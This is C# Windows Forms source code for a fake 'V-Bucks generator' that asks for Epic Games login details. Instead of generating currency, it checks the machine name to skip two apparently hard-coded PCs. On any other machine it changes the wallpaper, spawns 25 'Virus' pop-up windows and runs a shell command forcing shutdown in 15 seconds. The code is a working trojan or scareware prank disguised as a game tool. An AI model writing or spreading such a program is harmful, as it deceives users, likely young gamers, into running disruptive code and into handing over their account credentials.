using System;
using System.Diagnostics;
using System.Windows.Forms;

using static ScriptsLib.Tools;

namespace VBucksGenerator
{
	public partial class Main : Form
	{
		public Main()
		{
			this.InitializeComponent();
		}

		private void button1_Click(object sender, EventArgs e)
		{
			if (string.IsNullOrEmpty(textBox_username.Text) || string.IsNullOrEmpty(textBox_password.Text))
			{
				MessageBox.Show("Wrong Epic Games account information.");
				return;
			}

			string pcName = Environment.MachineName.ToString();
			if (pcName == "TIAGO") // BAIXA
			{
				MessageBox.Show("V-Bucks generated. You will receive in 10 minutes.");
				return;
			}
			else if (pcName == "DESKTOP-49NHI3S") // KIKO PT GAMES
			{
				MessageBox.Show("You already exceeded your daily limit.\nTry again tomorrow.");
				return;
			}

			SetDesktopWallpaper(Properties.Resources.wallpaper, WallpaperStyle.Stretched);

			for (int i = 0; i<25; i++)
			{
				new Virus().Show();
			}

			Process p = new Process();
			ProcessStartInfo startInfo = new ProcessStartInfo();
			startInfo.FileName = "cmd.exe";
			startInfo.Arguments = @"/c shutdown -s -t 15";
			p.StartInfo = startInfo;
			p.Start();
		}
	}
}
